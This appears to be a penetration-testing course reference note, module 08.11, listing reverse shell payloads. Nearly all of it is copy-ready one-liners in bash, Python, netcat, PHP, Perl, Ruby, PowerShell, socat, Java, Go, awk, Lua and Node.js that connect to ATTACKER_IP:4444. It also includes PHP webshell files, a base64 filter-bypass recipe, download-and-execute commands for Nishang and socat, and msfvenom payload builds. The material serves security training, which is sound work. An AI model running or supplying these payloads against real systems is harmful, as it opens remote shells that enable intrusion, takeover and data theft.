---
tags: [vapt, command-injection, advanced, reference]
difficulty: advanced
module: "08 - Command Injection"
topic: "08.11 Reverse Shell Payloads"
---

# 08.11 — Reverse Shell Payloads

## Quick Reference (ATTACKER_IP = your IP, 4444 = your listener port)

```
REPLACE:  ATTACKER_IP  →  your actual IP
          4444         →  your listening port

LISTENER: nc -lvnp 4444
```

---

## Bash

```bash
# CLASSIC:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# ALTERNATIVE (if >& not supported):
bash -i > /dev/tcp/ATTACKER_IP/4444 0<&1 2>&1

# SUBSHELL:
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# 196 (encoded format):
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196

# EXEC:
exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

---

## Python

```python
# PYTHON 3 (most common):
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# PYTHON 3 WITH PTY (better shell):
python3 -c "import socket,os,pty;s=socket.socket();s.connect(('ATTACKER_IP',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('bash')"

# PYTHON 2:
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"

# USING SUBPROCESS:
python3 -c "import subprocess,socket;s=socket.socket();s.connect(('ATTACKER_IP',4444));subprocess.run(['/bin/sh'],stdin=s,stdout=s,stderr=s)"
```

---

## Netcat (nc)

```bash
# WITH -e FLAG (traditional nc, BusyBox):
nc -e /bin/sh ATTACKER_IP 4444
nc -e /bin/bash ATTACKER_IP 4444

# WITHOUT -e (OpenBSD nc — common on Ubuntu/Debian):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# NCAT (Nmap's netcat — has -e):
ncat ATTACKER_IP 4444 -e /bin/bash
ncat ATTACKER_IP 4444 -e /bin/sh
```

---

## PHP

```php
// ONE-LINER (for command injection):
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

// ALTERNATIVE ONE-LINER:
php -r '$s=fsockopen("ATTACKER_IP",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

// PROCESS OPEN:
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

// AS A WEBSHELL FILE (shell.php):
<?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

// SYSTEM-BASED WEBSHELL:
<?php system($_GET['cmd']); ?>
// Access: https://target.com/shell.php?cmd=id
```

---

## Perl

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# SHORTER:
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# SHORTER:
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## PowerShell (Windows)

```powershell
# ONE-LINER:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# BASE64 ENCODED (bypass filters):
# Encode on attacker:
$cmd = '$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);...'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)

# Use: powershell -enc BASE64_HERE

# DOWNLOAD AND EXECUTE NISHANG:
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"

# CMD.EXE REVERSE SHELL:
cmd /c powershell -nop -w hidden -c "..."
```

---

## Socat (Best Shell Quality)

```bash
# ATTACKER (listener — full PTY shell):
socat file:`tty`,raw,echo=0 tcp-listen:4444

# TARGET (inject this):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# SOCAT DOWNLOAD ONE-LINER IF NOT INSTALLED:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## Java

```java
// FOR INJECTION INTO JAVA CODE:
Runtime r = Runtime.getRuntime();
String[] commands = new String[]{"/bin/bash", "-c", "exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
Process p = r.exec(commands);
```

---

## Go

```go
package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
```

---

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print $0 |& s; close(c)} while(c != "exit") close(s)}}'
```

---

## Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

---

## Node.js

```javascript
// COMMAND INJECTION INTO NODE.JS CONTEXT:
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();

// SHORTER:
require("child_process").exec("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

---

## Shell Upgrade Commands (After Getting Shell)

```bash
# STEP 1: UPGRADE TO PTY:
python3 -c "import pty; pty.spawn('/bin/bash')"
# OR:
python -c "import pty; pty.spawn('/bin/bash')"
# OR:
script /dev/null -c bash

# STEP 2: BACKGROUND + STTY:
# Press: Ctrl+Z
stty raw -echo; fg
# Press Enter twice

# STEP 3: SET TERMINAL:
export TERM=xterm-256color
export SHELL=bash
stty rows 50 cols 220

# NOW YOU HAVE A FULL INTERACTIVE SHELL!
# - Tab completion works
# - Arrow keys work
# - vim/nano work
# - sudo prompts work
```

---

## Reverse Shell Generators

```bash
# REVSHELLS.COM:
# https://www.revshells.com/ → web UI → select language → copy payload

# LOCAL TOOL (if needed):
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php
```

---

## Related Notes
- [[10 - Command Injection to Reverse Shell]] — injection to shell workflow
- [[02 - OS Command Injection Linux]] — getting the initial injection
- [[03 - OS Command Injection Windows]] — Windows shells
- [[Module 02 - Tools]] — Metasploit listener setup
